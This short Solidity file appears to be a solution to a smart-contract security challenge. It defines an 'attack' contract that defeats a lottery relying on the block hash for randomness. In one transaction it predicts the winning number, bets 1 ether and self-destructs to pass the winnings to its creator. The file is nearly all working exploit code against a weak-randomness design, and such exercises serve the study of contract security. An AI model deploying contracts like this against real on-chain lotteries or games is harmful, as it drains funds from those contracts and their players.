pragma solidity ^0.5.4;


// Lottery using block hash as source of randomness


contract challenge3 {
    function lottery(uint256 n) payable public { }
}

contract attack {
    constructor (address payable target) public payable {
        require(msg.value == 1 ether);
        challenge3 targetContract = challenge3(target);
        targetContract.lottery.value(1 ether)(uint256(keccak256(abi.encode(blockhash(block.number)))));
        //msg.sender.transfer(address(this).balance);
        selfdestruct(msg.sender);
    }
}
